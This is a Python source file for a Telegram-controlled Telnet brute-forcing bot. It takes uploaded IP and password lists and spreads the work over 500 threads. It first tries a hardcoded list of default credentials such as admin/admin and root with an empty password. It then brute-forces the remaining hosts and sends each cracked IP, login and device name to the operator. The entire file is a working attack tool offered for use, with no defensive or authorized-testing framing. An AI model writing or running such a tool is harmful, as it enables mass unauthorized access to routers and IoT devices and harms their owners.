import os
import asyncio
import socket
import threading
import time
from queue import Queue
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telegram.constants import ParseMode

OWNER_ID = int(os.getenv('OWNER_ID', '0'))
BOT_TOKEN = os.getenv('BOT_TOKEN', '')

sudo_users = set()
user_states = {}
active_scans = {}

def format_time(seconds):
    if seconds < 0:
        seconds = 0
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    secs = int(seconds % 60)
    return f"{hours}:{minutes:02d}:{secs:02d}"

class TelnetScanner:
    def __init__(self, chat_id, bot, scan_threads=500, timeout=8):
        self.chat_id = chat_id
        self.bot = bot
        self.scan_threads = scan_threads
        self.timeout = timeout
        self.queue = Queue()
        self.brute_queue = Queue()
        self.results = []
        self.lock = threading.Lock()
        self.file_lock = threading.Lock()
        self.total_servers = 0
        self.checked_servers = 0
        self.running = True
        self.start_time = None
        self.message_id = None
        self.current_cred = ""
        self.loop = None
        self.stopped = False
        self.active_threads = 0
        self.phase = "DEFAULT_CHECK"
        self.failed_servers = []
        self.cracked_ips = set()
        self.results_file = f'telnet_results_{chat_id}.txt'
        self.usernames = []
        self.passwords = []
        
    def load_ips(self, content):
        ips = []
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                if ':' in line:
                    ip, port = line.split(':')
                    ips.append((ip.strip(), int(port)))
                else:
                    ips.append((line.strip(), 23))
        return ips
        
    def load_passwords(self, content):
        passwords = []
        for line in content.split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                passwords.append(line)
        return passwords
    
    def save_hit_to_file(self, result):
        with self.file_lock:
            try:
                with open(self.results_file, 'a') as f:
                    f.write(result + '\n')
            except Exception as e:
                print(f"Error saving: {e}")
    
    def check_telnet(self, ip, port, username, password):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((ip, port))
            
            device_name = "Unknown"
            
            # Wait for login prompt and capture banner
            data = b""
            start = time.time()
            while time.time() - start < self.timeout:
                try:
                    chunk = sock.recv(1024)
                    if not chunk:
                        break
                    data += chunk
                    data_lower = data.lower()
                    
                    # Extract device name from banner
                    try:
                        banner_text = data.decode('utf-8', errors='ignore')
                        # Common patterns
                        if 'welcome to' in banner_text.lower():
                            device_name = banner_text.split('Welcome to')[1].split('\n')[0].strip()[:50]
                        elif 'login:' in banner_text.lower():
                            lines = banner_text.split('\n')
                            for line in lines[:5]:
                                if line.strip() and 'login' not in line.lower():
                                    device_name = line.strip()[:50]
                                    break
                    except:
                        pass
                    
                    # Check for login prompt
                    if b'login' in data_lower or b'username' in data_lower or b'user' in data_lower:
                        # Send username
                        sock.send((username + '\r\n').encode())
                        
                        # Wait for password prompt
                        pwd_data = b""
                        pwd_start = time.time()
                        while time.time() - pwd_start < 3:
                            try:
                                chunk = sock.recv(1024)
                                if not chunk:
                                    break
                                pwd_data += chunk
                                pwd_lower = pwd_data.lower()
                                
                                if b'password' in pwd_lower or b'pass' in pwd_lower:
                                    # Send password
                                    sock.send((password + '\r\n').encode())
                                    
                                    # Check response
                                    response = b""
                                    resp_start = time.time()
                                    while time.time() - resp_start < 3:
                                        try:
                                            chunk = sock.recv(1024)
                                            if not chunk:
                                                break
                                            response += chunk
                                            resp_lower = response.lower()
                                            
                                            # Try to get hostname/device name after login
                                            try:
                                                resp_text = response.decode('utf-8', errors='ignore')
                                                # Extract hostname from prompt (user@hostname or hostname#)
                                                for line in resp_text.split('\n'):
                                                    if '@' in line and ('#' in line or '$' in line or '>' in line):
                                                        device_name = line.split('@')[1].split('#')[0].split('$')[0].split('>')[0].strip()[:50]
                                                        break
                                                    elif line.strip().endswith('#') or line.strip().endswith('$'):
                                                        parts = line.strip().split()
                                                        if parts:
                                                            device_name = parts[0].strip()[:50]
                                                        break
                                            except:
                                                pass
                                            
                                            # Success indicators
                                            if any(x in resp_lower for x in [b'#', b'$', b'>', b'~', b'welcome', b'last login']):
                                                # Failed login indicators
                                                if not any(x in resp_lower for x in [b'incorrect', b'failed', b'denied', b'invalid', b'bad']):
                                                    sock.close()
                                                    return True, device_name
                                            
                                            # Failure indicators
                                            if any(x in resp_lower for x in [b'incorrect', b'failed', b'denied', b'invalid', b'bad login']):
                                                sock.close()
                                                return False, None
                                        except socket.timeout:
                                            break
                                    
                                    sock.close()
                                    return False, None
                            except socket.timeout:
                                break
                        
                        sock.close()
                        return False, None
                except socket.timeout:
                    break
            
            sock.close()
            return False, None
            
        except socket.timeout:
            return False, None
        except Exception as e:
            return False, None
    
    def default_worker(self):
        default_creds = [
            ("admin", "admin"),
            ("root", "root"),
            ("admin", "password"),
            ("admin", "1234"),
            ("root", "12345"),
            ("admin", ""),
            ("root", ""),
            ("", ""),
            ("user", "user"),
            ("admin", "admin123")
        ]
        
        while self.running:
            try:
                item = self.queue.get(timeout=1)
            except:
                continue
            if item is None:
                break
            
            with self.lock:
                self.active_threads += 1
            
            ip, port = item
            
            if not self.running:
                with self.lock:
                    self.active_threads -= 1
                break
            
            found = False
            for username, password in default_creds:
                if not self.running:
                    break
                    
                with self.lock:
                    if password:
                        self.current_cred = f"{username}:{password}"
                    else:
                        self.current_cred = f"{username}:(empty)"
                
                success, device_name = self.check_telnet(ip, port, username, password)
                
                if success:
                    if password:
                        result = f"{ip}:{port} | {username}:{password} | [{device_name}]"
                    else:
                        result = f"{ip}:{port} | {username}:(empty) | [{device_name}]"
                    with self.lock:
                        self.results.append(result)
                        self.cracked_ips.add(f"{ip}:{port}")
                    self.save_hit_to_file(result)
                    if self.loop:
                        asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
                    found = True
                    break
            
            if not found:
                with self.lock:
                    self.failed_servers.append((ip, port))
            
            with self.lock:
                self.checked_servers += 1
                self.active_threads -= 1
    
    def brute_worker(self):
        while self.running:
            try:
                item = self.brute_queue.get(timeout=1)
            except:
                continue
            if item is None:
                break
            
            with self.lock:
                self.active_threads += 1
            
            ip, port = item
            ip_port_key = f"{ip}:{port}"
            
            if not self.running:
                with self.lock:
                    self.active_threads -= 1
                break
            
            with self.lock:
                if ip_port_key in self.cracked_ips:
                    self.checked_servers += 1
                    self.active_threads -= 1
                    continue
            
            for username in self.usernames:
                for password in self.passwords:
                    if not self.running:
                        break
                    with self.lock:
                        self.current_cred = f"{username}:{password}"
                    
                    success, device_name = self.check_telnet(ip, port, username, password)
                    if success:
                        result = f"{ip}:{port} | {username}:{password} | [{device_name}]"
                        with self.lock:
                            self.results.append(result)
                        self.save_hit_to_file(result)
                        if self.loop:
                            asyncio.run_coroutine_threadsafe(self.send_hit(result), self.loop)
                        break
                if not self.running:
                    break
            
            with self.lock:
                self.checked_servers += 1
                self.active_threads -= 1
    
    def stop(self):
        self.running = False
        self.stopped = True
    
    async def send_hit(self, result):
        text = f"<b>TELNET HIT FOUND</b>\n\n<code>{result}</code>"
        try:
            await self.bot.send_message(chat_id=self.chat_id, text=text, parse_mode=ParseMode.HTML)
        except:
            pass
    
    async def update_progress(self):
        while self.running:
            await asyncio.sleep(3)
            if not self.running:
                break
            with self.lock:
                hits = len(self.results)
                current = self.current_cred
                active = self.active_threads
            
            elapsed = time.time() - self.start_time
            
            if current:
                trying_text = f'Trying "{current}"'
            else:
                trying_text = 'Checking defaults'
            
            text = (
                f"<b>TELNET SCANNER</b>\n"
                f"<b>Hits Found:</b> {hits}\n"
                f"<b>Elapsed:</b> {format_time(elapsed)}\n"
                f"<b>Active Threads:</b> {active}\n"
                f"{trying_text}"
            )
            keyboard = [[InlineKeyboardButton("STOP", callback_data=f"stop_{self.chat_id}")]]
            try:
                if self.message_id:
                    await self.bot.edit_message_text(
                        chat_id=self.chat_id,
                        message_id=self.message_id,
                        text=text,
                        parse_mode=ParseMode.HTML,
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
            except:
                pass
    
    async def run(self, ips_content, passwords_content):
        try:
            self.loop = asyncio.get_event_loop()
            
            print(f"[TELNET] Loading...")
            ips = self.load_ips(ips_content)
            self.passwords = self.load_passwords(passwords_content)
            self.usernames = ['admin', 'root', 'user', 'administrator']
            self.total_servers = len(ips)
            self.start_time = time.time()
            
            if os.path.exists(self.results_file):
                os.remove(self.results_file)
            
            print(f"[TELNET] {len(ips)} servers")
            
            msg = await self.bot.send_message(
                chat_id=self.chat_id,
                text=f"<b>TELNET SCAN STARTED</b>\n\n<b>Servers:</b> {self.total_servers:,}\n<b>Threads:</b> {self.scan_threads}\n<b>Phase 1:</b> Checking defaults",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("STOP", callback_data=f"stop_{self.chat_id}")]])
            )
            self.message_id = msg.message_id
            
            update_task = asyncio.create_task(self.update_progress())
            
            # PHASE 1
            print(f"[P1] Starting threads...")
            threads = []
            for i in range(self.scan_threads):
                t = threading.Thread(target=self.default_worker, daemon=True)
                t.start()
                threads.append(t)
            
            print(f"[P1] Adding to queue...")
            for ip_info in ips:
                self.queue.put(ip_info)
            
            print(f"[P1] Waiting...")
            while not self.queue.empty() or self.active_threads > 0:
                await asyncio.sleep(0.5)
                if not self.running:
                    break
            
            print(f"[P1] Stopping threads...")
            for _ in range(self.scan_threads):
                self.queue.put(None)
            
            for t in threads:
                t.join(timeout=2)
            
            print(f"[P1 DONE] Defaults:{len(self.cracked_ips)} Brute:{len(self.failed_servers)}")
            
            # PHASE 2
            if self.running and len(self.failed_servers) > 0 and len(self.passwords) > 0:
                print(f"[P2] Starting threads...")
                self.phase = "BRUTE_FORCE"
                self.checked_servers = 0
                
                threads = []
                for i in range(self.scan_threads):
                    t = threading.Thread(target=self.brute_worker, daemon=True)
                    t.start()
                    threads.append(t)
                
                print(f"[P2] Adding to queue...")
                for ip_info in self.failed_servers:
                    self.brute_queue.put(ip_info)
                
                print(f"[P2] Waiting...")
                while not self.brute_queue.empty() or self.active_threads > 0:
                    await asyncio.sleep(0.5)
                    if not self.running:
                        break
                
                print(f"[P2] Stopping threads...")
                for _ in range(self.scan_threads):
                    self.brute_queue.put(None)
                
                for t in threads:
                    t.join(timeout=2)
                
                print(f"[P2 DONE] Hits:{len(self.results)}")
            
            self.running = False
            update_task.cancel()
            
            elapsed = time.time() - self.start_time
            print(f"[DONE] {len(self.results)} hits in {elapsed:.2f}s")
            
            await self.bot.edit_message_text(
                chat_id=self.chat_id,
                message_id=self.message_id,
                text=f"<b>SCAN COMPLETED</b>\n\n<b>Hits:</b> {len(self.results)}\n<b>Time:</b> {format_time(elapsed)}",
                parse_mode=ParseMode.HTML
            )
            
            if len(self.results) > 0 and os.path.exists(self.results_file):
                with open(self.results_file, 'rb') as f:
                    await self.bot.send_document(
                        chat_id=self.chat_id,
                        document=f,
                        filename=f'telnet_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
                    )
        
        finally:
            if self.chat_id in active_scans:
                del active_scans[self.chat_id]

def is_authorized(user_id):
    return user_id == OWNER_ID or user_id in sudo_users

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("Not authorized.")
        return
    
    keyboard = [
        [InlineKeyboardButton("START TELNET SCAN", callback_data="new_scan")],
        [InlineKeyboardButton("SETTINGS", callback_data="settings")],
    ]
    if user_id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
    
    await update.message.reply_text("<b>TELNET BRUTE FORCER</b>\n\nSelect option", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    try:
        await query.answer()
    except:
        pass
    
    if not is_authorized(user_id):
        return
    
    if query.data == "new_scan":
        if user_id in active_scans:
            await query.edit_message_text("Already scanning")
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "waiting_ips"
        await query.edit_message_text("Send IP list (ip:port or just ip)")
    
    elif query.data == "settings":
        if user_id not in user_states:
            user_states[user_id] = {}
        if "settings" not in user_states[user_id]:
            user_states[user_id]["settings"] = {"threads": 500, "timeout": 8}
        s = user_states[user_id]["settings"]
        keyboard = [
            [InlineKeyboardButton(f"Threads: {s['threads']}", callback_data="set_threads")],
            [InlineKeyboardButton(f"Timeout: {s['timeout']}s", callback_data="set_timeout")],
            [InlineKeyboardButton("BACK", callback_data="back_main")]
        ]
        await query.edit_message_text("<b>SETTINGS</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
    
    elif query.data.startswith("set_"):
        setting = query.data.replace("set_", "")
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = f"setting_{setting}"
        await query.edit_message_text(f"Send value for {setting}")
    
    elif query.data == "sudo_menu":
        if user_id != OWNER_ID:
            return
        sudo_list = "\n".join([f"- {uid}" for uid in sudo_users]) if sudo_users else "No sudo users"
        keyboard = [
            [InlineKeyboardButton("ADD", callback_data="add_sudo")],
            [InlineKeyboardButton("REMOVE", callback_data="remove_sudo")],
            [InlineKeyboardButton("BACK", callback_data="back_main")]
        ]
        await query.edit_message_text(f"<b>SUDO USERS</b>\n\n{sudo_list}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
    
    elif query.data == "add_sudo":
        if user_id != OWNER_ID:
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "add_sudo"
        await query.edit_message_text("Send user ID")
    
    elif query.data == "remove_sudo":
        if user_id != OWNER_ID:
            return
        if user_id not in user_states:
            user_states[user_id] = {}
        user_states[user_id]["step"] = "remove_sudo"
        await query.edit_message_text("Send user ID")
    
    elif query.data == "back_main":
        keyboard = [
            [InlineKeyboardButton("START TELNET SCAN", callback_data="new_scan")],
            [InlineKeyboardButton("SETTINGS", callback_data="settings")]
        ]
        if user_id == OWNER_ID:
            keyboard.append([InlineKeyboardButton("SUDO USERS", callback_data="sudo_menu")])
        await query.edit_message_text("<b>TELNET BRUTE FORCER</b>", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
    
    elif query.data.startswith("stop_"):
        chat_id = int(query.data.split("_")[1])
        if chat_id in active_scans:
            active_scans[chat_id].stop()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        return
    
    if user_id not in user_states:
        return
    
    state = user_states[user_id]
    
    if state.get("step") == "waiting_ips":
        if update.message.document:
            try:
                file = await context.bot.get_file(update.message.document.file_id)
                
                if file.file_size > 10 * 1024 * 1024:
                    await update.message.reply_text("File too large! Max 10MB.")
                    return
                
                content = await file.download_as_bytearray()
                state["ips_content"] = content.decode('utf-8')
                
                lines = len([l for l in state["ips_content"].split('\n') if l.strip() and not l.startswith('#')])
                
                state["step"] = "waiting_passwords"
                await update.message.reply_text(f"Loaded {lines} IPs. Now send password list")
            except Exception as e:
                await update.message.reply_text(f"Error: {str(e)}")
        else:
            await update.message.reply_text("Please send a file")
    
    elif state.get("step") == "waiting_passwords":
        if update.message.document:
            try:
                file = await context.bot.get_file(update.message.document.file_id)
                
                if file.file_size > 1 * 1024 * 1024:
                    await update.message.reply_text("File too large! Max 1MB.")
                    return
                
                content = await file.download_as_bytearray()
                state["passwords_content"] = content.decode('utf-8')
                
                lines = len([l for l in state["passwords_content"].split('\n') if l.strip() and not l.startswith('#')])
                
                if "settings" not in state:
                    state["settings"] = {"threads": 500, "timeout": 8}
                s = state["settings"]
                
                await update.message.reply_text(f"Loaded {lines} passwords. Starting scan...")
                
                scanner = TelnetScanner(user_id, context.bot, s["threads"], s["timeout"])
                active_scans[user_id] = scanner
                
                asyncio.create_task(scanner.run(state["ips_content"], state["passwords_content"]))
                del user_states[user_id]
            except Exception as e:
                await update.message.reply_text(f"Error: {str(e)}")
        else:
            await update.message.reply_text("Please send a file")
    
    elif state.get("step", "").startswith("setting_"):
        setting = state["step"].replace("setting_", "")
        try:
            value = int(update.message.text)
            if "settings" not in state:
                state["settings"] = {"threads": 500, "timeout": 8}
            state["settings"][setting] = value
            await update.message.reply_text(f"{setting} = {value}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="settings")]]))
        except:
            await update.message.reply_text("Invalid number")
    
    elif state.get("step") == "add_sudo":
        try:
            sudo_id = int(update.message.text)
            sudo_users.add(sudo_id)
            await update.message.reply_text(f"Added {sudo_id}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("BACK", callback_data="sudo_menu")]]))
        except:
            await update.message.reply_text("Invalid ID")
        if user_id in user_states:
            del user_states[user_id]
    
    elif state.get("step") == "remove_sudo":
        try:
            sudo_id = int(update.message.text)
            if sudo_id in sudo_users:
                sudo_users.remove(sudo_id)
                await update.message.reply_text(f"Removed {sudo_id}")
            else:
                await update.message.reply_text("Not in list")
        except:
            await update.message.reply_text("Invalid ID")
        if user_id in user_states:
            del user_states[user_id]

def main():
    if not BOT_TOKEN or OWNER_ID == 0:
        print("Set BOT_TOKEN and OWNER_ID")
        return
    
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.ALL, handle_message))
    
    print("Telnet Bot started")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
